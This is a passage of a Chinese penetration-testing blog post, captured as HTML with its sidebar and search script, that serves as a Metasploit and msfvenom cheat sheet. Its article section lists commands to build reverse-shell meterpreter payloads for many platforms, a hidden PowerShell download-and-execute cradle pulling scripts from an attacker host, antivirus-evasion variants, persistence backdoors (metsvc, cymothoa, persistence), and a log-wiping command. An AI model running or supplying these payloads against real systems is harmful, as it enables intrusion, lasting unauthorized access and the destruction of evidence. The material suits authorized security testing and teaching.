+<td style="text-align:center">SNMP扫描设备</td>
+</tr>
+<tr>
+<td style="text-align:center">auxiliary/scanner/telnet/telnet_login</td>
+<td style="text-align:center">TELNET登录</td>
+</tr>
+<tr>
+<td style="text-align:center">scanner/vnc/vnc_none_auth</td>
+<td style="text-align:center">VNC空口令扫描</td>
+</tr>
+</tbody>
+</table>
+<h3 id="RC脚本"><a href="#RC脚本" class="headerlink" title="RC脚本"></a>RC脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将较常用的命令保存为xx.rc</span></span><br><span class="line"><span class="comment"># msfconsole -r xx.rc</span></span><br><span class="line"><span class="comment"># msf resource xx.rc</span></span><br><span class="line">use exploit/multi/handler </span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.22.170</span><br><span class="line"><span class="built_in">set</span> lport 6661</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+<h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.135.100 LPORT=1234 -f bash -o text</span><br><span class="line"></span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.135.100 LPORT=1234 -f sh -o text</span><br></pre></td></tr></table></figure>
+<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-reflection -o /mnt/c/Users/sherd/Desktop/a.ps1</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh -o /mnt/c/Users/sherd/Desktop/a.ps1</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-net -o /mnt/c/Users/sherd/Desktop/a.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行</span></span><br><span class="line">powershell -w hidden -<span class="built_in">exec</span> bypass -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.135.100/a.ps1');a.ps1"</span></span><br><span class="line"></span><br><span class="line">PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File xxx.ps1</span><br><span class="line"><span class="comment">#黏贴执行</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-cmd -o /mnt/c/Users/sherd/Desktop/a.txt</span><br></pre></td></tr></table></figure>
+<p>与powersploit联动</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成shellcode #ps1生成的shellcode一致</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_https lhost=192.168.102.1 lport=4444 -f powershell -o /var/www/html/PowerSploit/<span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.102.1/PowerSploit/CodeExecution/Invoke-Shellcode.ps1"</span>)</span><br><span class="line"></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.102.1/PowerSploit/test"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行</span></span><br><span class="line">Invoke-Shellcode -Shellcode (<span class="variable">$buf</span>) -Force</span><br></pre></td></tr></table></figure>
+<h4 id="Win"><a href="#Win" class="headerlink" title="Win"></a>Win</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exe-only exe-service exe-small</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f exe -o a.exe</span><br></pre></td></tr></table></figure>
+<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f jar -o text.jar</span><br></pre></td></tr></table></figure>
+<h4 id="Php"><a href="#Php" class="headerlink" title="Php"></a>Php</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt; text.php</span><br></pre></td></tr></table></figure>
+<h4 id="Jsp"><a href="#Jsp" class="headerlink" title="Jsp"></a>Jsp</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt;text.jsp</span><br><span class="line"></span><br><span class="line"><span class="comment">#免杀</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f jsp -o /mnt/c/Users/sherd/Desktop/jsp.jsp</span><br><span class="line"></span><br><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f war -o text.war</span><br></pre></td></tr></table></figure>
+<h4 id="Asp"><a href="#Asp" class="headerlink" title="Asp"></a>Asp</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f asp -o shell.asp</span><br></pre></td></tr></table></figure>
+<h4 id="Aspx"><a href="#Aspx" class="headerlink" title="Aspx"></a>Aspx</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform win -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f aspx -o /home/niexinming/back.aspx</span><br></pre></td></tr></table></figure>
+<h4 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 R &gt; text.apk</span><br></pre></td></tr></table></figure>
+<h3 id="Metasploit-BacokDoor"><a href="#Metasploit-BacokDoor" class="headerlink" title="Metasploit BacokDoor"></a>Metasploit BacokDoor</h3><h4 id="Metsvc服务"><a href="#Metsvc服务" class="headerlink" title="Metsvc服务"></a>Metsvc服务</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run metsvc -A <span class="comment">#自动安装后门</span></span><br><span class="line">run metsvc <span class="comment"># 自定义后门</span></span><br><span class="line"><span class="built_in">set</span> payload windows/metsvc_bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost 目标ip</span><br><span class="line"><span class="built_in">set</span> lport 目标监听端口</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h4 id="Cymothoa"><a href="#Cymothoa" class="headerlink" title="Cymothoa"></a>Cymothoa</h4><p>上传到目标机</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cymotha -p 982 -s 1 -y 4444</span><br><span class="line">nc -nvv 目标ip 4444</span><br></pre></td></tr></table></figure>
+<h4 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run persistence -A -S -U -i 60 -p 4321 -r ip</span><br><span class="line">run persistence -A -U -X -i 60 -p 6666 -r ip</span><br><span class="line">	-A 自启动payload</span><br><span class="line">	-S 系统自启动加载（服务）</span><br><span class="line">	-U 用户登录自启动</span><br><span class="line">	-X 开机自加载</span><br><span class="line">	-i 回连时间间隔</span><br><span class="line">	-P 监听反向连接端口号</span><br><span class="line">	-r 目标机器IP</span><br></pre></td></tr></table></figure>
+<h2 id="日志清除"><a href="#日志清除" class="headerlink" title="日志清除"></a>日志清除</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除目标机上的应用程序、系统和安全日志</span></span><br><span class="line">clearev</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束,感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+    
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/19/Typhoon/" rel="next" title="渗透实战:Typhoon靶机入侵">
+                <i class="fa fa-chevron-left"></i> 渗透实战:Typhoon靶机入侵
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/20/CodeAudit-Java-Webgoat/" rel="prev" title="从WebGoat学习Java代码审计">
+                从WebGoat学习Java代码审计 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="t43wiu6">
+            
+              <p class="site-author-name" itemprop="name">t43wiu6</p>
+              <p class="site-description motion-element" itemprop="description">何人的归宿是星辰大海?</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/t43wiu6" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://gh0st.cn/" title="Acmesec_Chen" target="_blank">Acmesec_Chen</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://quyunjie.cn/" title="quyunjie" target="_blank">quyunjie</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chybeta.github.io/" title="chybeta" target="_blank">chybeta</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://rcoil.me/" title="Rcoll" target="_blank">Rcoll</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://yulige.top/" title="郁离歌" target="_blank">郁离歌</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Meterpreter"><span class="nav-number">1.</span> <span class="nav-text">Meterpreter</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本命令"><span class="nav-number">1.1.</span> <span class="nav-text">基本命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#进程迁移"><span class="nav-number">1.2.</span> <span class="nav-text">进程迁移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#信息搜集"><span class="nav-number">1.3.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权模块"><span class="nav-number">1.4.</span> <span class="nav-text">提权模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BypassUAC"><span class="nav-number">1.4.1.</span> <span class="nav-text">BypassUAC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#令牌操纵"><span class="nav-number">1.4.2.</span> <span class="nav-text">令牌操纵</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#令牌伪造"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">令牌伪造</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#窃取令牌"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">窃取令牌</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内核提权"><span class="nav-number">1.4.3.</span> <span class="nav-text">内核提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#密码抓取"><span class="nav-number">1.5.</span> <span class="nav-text">密码抓取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#屏幕抓取"><span class="nav-number">1.6.</span> <span class="nav-text">屏幕抓取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#摄像头抓取"><span class="nav-number">1.7.</span> <span class="nav-text">摄像头抓取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#键盘操纵"><span class="nav-number">1.8.</span> <span class="nav-text">键盘操纵</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#键盘开关"><span class="nav-number">1.8.1.</span> <span class="nav-text">键盘开关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#键盘记录"><span class="nav-number">1.8.2.</span> <span class="nav-text">键盘记录</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#添加用户"><span class="nav-number">1.9.</span> <span class="nav-text">添加用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件操作"><span class="nav-number">1.10.</span> <span class="nav-text">文件操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件搜索"><span class="nav-number">1.11.</span> <span class="nav-text">文件搜索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注册表操作"><span class="nav-number">1.12.</span> <span class="nav-text">注册表操作</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit"><span class="nav-number">2.</span> <span class="nav-text">Metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本命令-1"><span class="nav-number">2.1.</span> <span class="nav-text">基本命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#自动路由"><span class="nav-number">2.2.</span> <span class="nav-text">自动路由</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置代理"><span class="nav-number">2.3.</span> <span class="nav-text">配置代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf端口扫描"><span class="nav-number">2.4.</span> <span class="nav-text">msf端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf-arp扫描"><span class="nav-number">2.5.</span> <span class="nav-text">msf_arp扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap存活扫描"><span class="nav-number">2.6.</span> <span class="nav-text">nmap存活扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#应用扫描"><span class="nav-number">2.7.</span> <span class="nav-text">应用扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扫描利用"><span class="nav-number">2.8.</span> <span class="nav-text">扫描利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#批量导入目标ip"><span class="nav-number">2.8.1.</span> <span class="nav-text">批量导入目标ip</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#扫描445"><span class="nav-number">2.8.2.</span> <span class="nav-text">扫描445</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#扫描MS17-010"><span class="nav-number">2.8.3.</span> <span class="nav-text">扫描MS17-010</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用MS17-010"><span class="nav-number">2.8.4.</span> <span class="nav-text">利用MS17-010</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口转发"><span class="nav-number">2.9.</span> <span class="nav-text">端口转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#抓包嗅探"><span class="nav-number">2.10.</span> <span class="nav-text">抓包嗅探</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#辅助模块"><span class="nav-number">2.11.</span> <span class="nav-text">辅助模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RC脚本"><span class="nav-number">2.12.</span> <span class="nav-text">RC脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Msfvenom"><span class="nav-number">3.</span> <span class="nav-text">Msfvenom</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux"><span class="nav-number">3.0.1.</span> <span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Powershell"><span class="nav-number">3.0.2.</span> <span class="nav-text">Powershell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Win"><span class="nav-number">3.0.3.</span> <span class="nav-text">Win</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java"><span class="nav-number">3.0.4.</span> <span class="nav-text">Java</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Php"><span class="nav-number">3.0.5.</span> <span class="nav-text">Php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Jsp"><span class="nav-number">3.0.6.</span> <span class="nav-text">Jsp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Asp"><span class="nav-number">3.0.7.</span> <span class="nav-text">Asp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Aspx"><span class="nav-number">3.0.8.</span> <span class="nav-text">Aspx</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Android"><span class="nav-number">3.0.9.</span> <span class="nav-text">Android</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit-BacokDoor"><span class="nav-number">3.1.</span> <span class="nav-text">Metasploit BacokDoor</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Metsvc服务"><span class="nav-number">3.1.1.</span> <span class="nav-text">Metsvc服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cymothoa"><span class="nav-number">3.1.2.</span> <span class="nav-text">Cymothoa</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Persistence"><span class="nav-number">3.1.3.</span> <span class="nav-text">Persistence</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#日志清除"><span class="nav-number">4.</span> <span class="nav-text">日志清除</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">t43wiu6</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
